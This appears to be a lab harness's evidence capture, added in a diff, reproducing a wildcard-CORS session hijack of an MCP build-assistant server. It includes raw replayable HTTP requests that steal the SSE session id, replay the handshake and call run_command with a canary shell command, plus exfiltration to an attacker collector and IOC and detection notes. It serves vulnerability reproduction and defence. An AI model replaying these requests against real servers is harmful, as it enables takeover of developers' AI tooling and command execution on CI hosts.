@@ -1,0 +1,133 @@
+# Meridian Range evidence capture (written by the harness, not by hand).
+# module   : 01-cors-session-hijack
+# variant  : vuln
+# verdict  : ATTACK-OK (reproduced)
+# captured : 2026-08-02T09:45:23.564Z
+# Addresses and hostnames below are lab-internal; the canary is benign by construction.
+==============================================================================
+  CVE-2026-34237  Wildcard CORS session hijack over the MCP HTTP/SSE transport
+  target http://mcp.lab.consulereit.nl:8080   attacker Origin https://attacker.lab.consulereit.nl
+  started 2026-08-02T09:45:23.323Z   canary-only, labnet-internal
+==============================================================================
+
+[INFO ] Attacker page at https://attacker.lab.consulereit.nl models a "build #4209 failed" status link a developer opens.
+[STEP ] Opening MCP session: cross-origin GET /mcp/sse from Origin https://attacker.lab.consulereit.nl
+[PASS ] Wildcard CORS confirmed: Access-Control-Allow-Origin: *
+[PASS ] Session identifier exposed: 36dcd659...84bb
+[STEP ] Session replay: completing the MCP handshake over the stolen session
+[PASS ] Session replay successful: initialize accepted over the stolen session
+[INFO ] Recon: list_builds enumerated 4 pipeline runs through the hijacked session
+[STEP ] Tool invocation: relaying tools/call run_command (benign canary) cross-origin
+[PASS ] Tool invocation accepted: run_command executed in the CI workspace
+[PASS ] Canary executed: LAB_CANARY_48 returned to the attacker
+[INFO ] Exfiltrated canary output to attacker-collector (http://collector.lab.consulereit.nl:9000/pwned)
+
+RESULT
+------
+  Vulnerability : CVE-2026-34237 (CWE-942)
+  Scenario      : 01-cors-session-hijack
+  Status        : REPRODUCED
+  Confidence    : HIGH
+  Duration      : 240 ms
+
+EVIDENCE (observed facts)
+-------------------------
+  - The cross-origin SSE response carried Access-Control-Allow-Origin: * (CWE-942), so a page on any Origin may read the stream.
+  - The SSE endpoint event disclosed the message endpoint /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb; reading it is stealing the session (MCP HTTP/SSE has no separate bearer credential).
+  - The victim's session accepted a foreign-Origin initialize handshake, confirming the session id alone is sufficient to drive it (session reuse).
+  - Recon over the hijacked session read the victim's CI state (list_builds returned 4 pipeline runs).
+  - The capability tool run_command accepted the relayed foreign-Origin call and executed a shell command in the CI workspace.
+  - Proof-of-execution canary LAB_CANARY_48 was returned in the tool output ("uid=10001(appsvc) gid=10001(appsvc) groups=10001(appsvc)" ...), confirming code execution via the hijacked session.
+  - The canary output was exfiltrated to the attacker collector at http://collector.lab.consulereit.nl:9000/pwned (labnet-internal sink; nothing leaves the lab).
+
+CONCLUSION
+----------
+  The evidence demonstrates successful reproduction of the vulnerability
+  described in CVE-2026-34237. The MCP Java SDK HTTP/SSE transport returned
+  a wildcard Access-Control-Allow-Origin, disclosed the per-connection
+  session id on the SSE endpoint event, and accepted a foreign-Origin replay
+  of that session that drove the capability tool run_command to execution. A
+  web page on any Origin the developer opens can therefore achieve remote,
+  cross-origin control of the victim's build assistant.
+
+EVIDENCE TIMELINE
+-----------------
+  09:45:23.325  +    2ms  Attacker page at https://attacker.lab.consulereit.nl models a "build #4209 failed" status link a developer opens.
+  09:45:23.325  +    2ms  Opening MCP session: cross-origin GET /mcp/sse from Origin https://attacker.lab.consulereit.nl
+  09:45:23.413  +   90ms  Wildcard CORS confirmed: Access-Control-Allow-Origin: *
+  09:45:23.413  +   90ms  Session identifier exposed: 36dcd659...84bb
+  09:45:23.413  +   90ms  Attacker page lifted the session id cross-origin
+  09:45:23.413  +   90ms  Session replay: completing the MCP handshake over the stolen session
+  09:45:23.480  +  157ms  Session replay successful: initialize accepted over the stolen session
+  09:45:23.513  +  190ms  Recon: list_builds enumerated 4 pipeline runs through the hijacked session
+  09:45:23.513  +  190ms  Tool invocation: relaying tools/call run_command (benign canary) cross-origin
+  09:45:23.542  +  219ms  Tool invocation accepted: run_command executed in the CI workspace
+  09:45:23.542  +  219ms  Canary executed: LAB_CANARY_48 returned to the attacker
+  09:45:23.542  +  219ms  Canary output returned over the SSE stream to the attacker page
+  09:45:23.557  +  234ms  Exfiltrated canary output to attacker-collector (http://collector.lab.consulereit.nl:9000/pwned)
+
+RAW HTTP EVIDENCE (replayable protocol capture)
+-----------------------------------------------
+
+  # Session-id read - cross-origin SSE (EventSource GET)
+  > GET /mcp/sse HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > accept: text/event-stream
+  > origin: https://attacker.lab.consulereit.nl
+  < HTTP/1.1 200
+  < access-control-allow-origin: *
+  < content-type: text/event-stream;charset=UTF-8
+  < cache-control: no-cache
+  < connection: keep-alive, keep-alive
+  < transfer-encoding: chunked
+  < [SSE] event: endpoint
+  < [SSE] data: /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb
+
+  # Session replay - MCP handshake over the hijacked session (text/plain POST, no preflight)
+  > POST /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > content-type: application/json
+  > accept: application/json, text/event-stream
+  > origin: https://attacker.lab.consulereit.nl
+  > {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"attacker.lab.consulereit.nl","version":"0.0.0"}}}
+  < HTTP/1.1 200 (JSON-RPC accepted; result returns on the SSE stream)
+  < [JSON-RPC recv] {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"logging":{},"tools":{"listChanged":true}},"serverInfo":{"name":"buildbot-mcp","version":"2.3.0"}}}
+  > POST /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > content-type: application/json
+  > accept: application/json, text/event-stream
+  > origin: https://attacker.lab.consulereit.nl
+  > {"jsonrpc":"2.0","method":"notifications/initialized"}
+  < HTTP/1.1 200 (JSON-RPC accepted; result returns on the SSE stream)
+  > POST /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > content-type: application/json
+  > accept: application/json, text/event-stream
+  > origin: https://attacker.lab.consulereit.nl
+  > {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"list_builds","arguments":{}}}
+  < HTTP/1.1 200 (JSON-RPC accepted; result returns on the SSE stream)
+  < [JSON-RPC recv] {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"#4207  backend-ci  main          passed  alice (a1c9f02)\n#4208  web-deploy  release/3.4   passed  bob (7d3e558)\n#4209  nightly-e2e main          failed  ci-bot (b90aa11)\n#4210  backend-ci  feat/quotas   running carol (5f1d7ac)"}],"isError":false}}
+
+  # Capability invocation - run_command (benign canary) over the hijacked session
+  > POST /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > content-type: application/json
+  > accept: application/json, text/event-stream
+  > origin: https://attacker.lab.consulereit.nl
+  > {"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"run_command","arguments":{"cmd":"id; hostname; echo LAB_CANARY_$$"}}}
+  < HTTP/1.1 200 (JSON-RPC accepted; result returns on the SSE stream)
+  < [JSON-RPC recv] {"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"uid=10001(appsvc) gid=10001(appsvc) groups=10001(appsvc)\nb32ff40add19\nLAB_CANARY_48"}],"isError":false}}
+
+IOC SUMMARY (incident-response artifact)
+----------------------------------------
+  Endpoints:       /mcp/sse  /mcp/message?sessionId=<redacted>
+  Methods:         GET, POST
+  Header Origin:   https://attacker.lab.consulereit.nl
+  Header Host:     mcp.lab.consulereit.nl:8080
+  User-Agent:      browser-class (Origin header present; drive-by observed as HeadlessChrome/124.0.0.0)
+  Session id:      (none)
+  Tools driven:    list_builds (recon), run_command (capability exec)
+  Source:          foreign browser Origin, labnet 172.28.0.0/16
+  Exfil sink:      http://collector.lab.consulereit.nl:9000/pwned
+  Detections:      ATR-2026-70001 (mcp.access, mcp.cors.cross_origin:true)  Elastic Defend EQL (java -> sh, LAB_CANARY)
+
